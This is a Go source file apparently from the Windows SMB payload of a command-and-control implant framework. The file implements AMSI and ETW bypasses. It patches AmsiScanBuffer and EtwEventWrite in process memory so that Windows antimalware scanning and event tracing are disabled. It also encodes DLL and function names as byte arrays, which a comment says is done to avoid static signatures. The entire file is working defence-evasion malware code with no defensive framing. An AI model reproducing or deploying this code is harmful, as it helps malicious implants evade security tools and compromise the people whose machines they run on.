// server/docker/payloads/SMB_Windows/patches.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Patches strings (constructed to avoid static signatures)
var (
	patchNtdllDLL              = string([]byte{0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c})                                                                                     // ntdll.dll
	patchAmsiDLL               = string([]byte{0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c})                                                                                           // amsi.dll
	patchAmsiScanBuffer        = string([]byte{0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72})                                                       // AmsiScanBuffer
	patchEtwEventWrite         = string([]byte{0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65})                                                             // EtwEventWrite
	patchVirtualProtect        = string([]byte{0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74})                                                       // VirtualProtect
	patchGetCurrentProcess     = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                     // GetCurrentProcess
	patchNtProtectVirtualMem   = string([]byte{0x4e, 0x74, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79})       // NtProtectVirtualMemory
)

var (
	ntdllDLL = syscall.NewLazyDLL(patchNtdllDLL)

	virtualProtect         = kernel32DLL.NewProc(patchVirtualProtect)
	getCurrentProcess      = kernel32DLL.NewProc(patchGetCurrentProcess)
	ntProtectVirtualMemory = ntdllDLL.NewProc(patchNtProtectVirtualMem)
)

// AMSI bypass
func patchAMSI() error {
	amsi := windows.NewLazySystemDLL(patchAmsiDLL)
	amsiScanBuffer := amsi.NewProc(patchAmsiScanBuffer)

	if amsiScanBuffer.Addr() == 0 {
		return fmt.Errorf(Err(E4))
	}

	var patch []byte
	if unsafe.Sizeof(uintptr(0)) == 8 {
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	} else {
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00}
	}

	return applyPatch(amsiScanBuffer.Addr(), patch)
}

// ETW bypass
func patchETW() error {
	ntdll := windows.NewLazySystemDLL(patchNtdllDLL)
	etwEventWrite := ntdll.NewProc(patchEtwEventWrite)

	if etwEventWrite.Addr() == 0 {
		return fmt.Errorf(Err(E4))
	}

	var patch []byte
	if unsafe.Sizeof(uintptr(0)) == 8 {
		patch = []byte{0x33, 0xC0, 0xC3}
	} else {
		patch = []byte{0x33, 0xC0, 0xC2, 0x14, 0x00}
	}

	return applyPatch(etwEventWrite.Addr(), patch)
}

func applyPatch(addr uintptr, patch []byte) error {
	var oldProtect uint32

	err := windows.VirtualProtect(
		addr,
		uintptr(len(patch)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return err
	}

	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	handle := windows.CurrentProcess()
	flushInstructionCache.Call(
		uintptr(handle),
		addr,
		uintptr(len(patch)),
	)

	windows.VirtualProtect(
		addr,
		uintptr(len(patch)),
		oldProtect,
		&oldProtect,
	)

	return nil
}
